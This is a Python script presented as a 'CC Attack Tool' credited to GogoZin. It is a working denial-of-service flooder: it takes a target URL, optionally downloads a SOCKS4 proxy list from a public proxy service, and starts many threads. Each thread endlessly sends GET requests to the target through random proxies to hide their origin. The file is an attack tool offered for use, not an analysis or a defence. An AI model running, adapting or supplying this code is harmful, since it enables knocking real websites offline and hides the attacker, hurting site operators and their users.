import requests
import random
from threading import Thread
from colorama import Fore

print(Fore.GREEN + """    	     .,:ccllllc:,.              
          .lOXWMMMMMMMMMWXOo,           
        .lKWMMMMMMMMMMMMMMMMNk:.        
      .oKWMMMMMMMMMMMMMMMMMMMMNx'       
     .xWMMMMMMMMMMMMMMMMMMMMMMMWO'      
     ;KMMMMMMMMMMMMMMMMMMMMMMMMMWd.     
     :XNKXWMMMMMMMMMMMMMMMMMMNXXWk.     
     ;Kx..:d0NMMMMMMMMMMMMXkc,.;0d.     
     .OO'   .,oOXWMMMMNKkc'    c0:      
      :KOc,.....:xXNNKd,....';oKk.      
       cXMWXK000XOlccdKK00KXNWMNc       
      .dWMMWX0XMNdcocckMMWX00NMNl       
      .oXX0o..oWWNNWNXNMMK; .oKx'       
        ....  cNXNNXXXOKWx.  ..         
              ,KKKX000OKK;              
              '0KKX0KK0X0'              
              .OK0XKKK0XO.              
              .k00K0K00Xk.              
               ldxOxOkx0o               
               ..',,;,',.               
""")
print("  CC Attack Tool Using Requests Module")
print("      Code By GogoZin. -2019/8/2")


def main():
	global pprr
	global list
	global proxy
	global url
	global pow
	url = str(input(Fore.BLUE + "Target : " + Fore.WHITE))
	thr = int(input(Fore.BLUE + "Threads : " + Fore.WHITE))
	cho = str(input(Fore.BLUE + "Get Some Fresh Socks ? (y/n) : " + Fore.WHITE))
	if cho =='y':
		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&anonymity=elite&ssl=yes')
		with open('socks.txt','wb') as fp:
			fp.write(rsp.content)
			print(Fore.YELLOW + "Sucess Get Fresh Socks List !")
	else:
		pass
	list = str(input(Fore.BLUE + "Socks List (socks.txt): " + Fore.WHITE))
	pow = int(input(Fore.BLUE + "CC.Power (1-100) : " + Fore.WHITE))
	for x in range(thr):
		x = Thread(target=atk, name=(x))
		x.start()

def atk():
	while True:
		pprr = open(list).readlines()
		proxy = random.choice(pprr).strip().split(":")
		s = requests.session()
		s.proxies = {}
		s.proxies['http'] = ("socks4://"+str(proxy[0])+":"+str(proxy[1]))
		s.proxies['https'] = ("socks4://"+str(proxy[0])+":"+str(proxy[1]))
		try:
			s.get(url)
			print(Fore.BLUE + "Socks Ddos From ~ / " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]))
			try:
				for y in range(pow):
					s.get(url)
			except:
				s.close()
		except:
			s.close()
			print(Fore.RED + "Socks Down !" + Fore.WHITE)


if __name__ == "__main__":
	main()
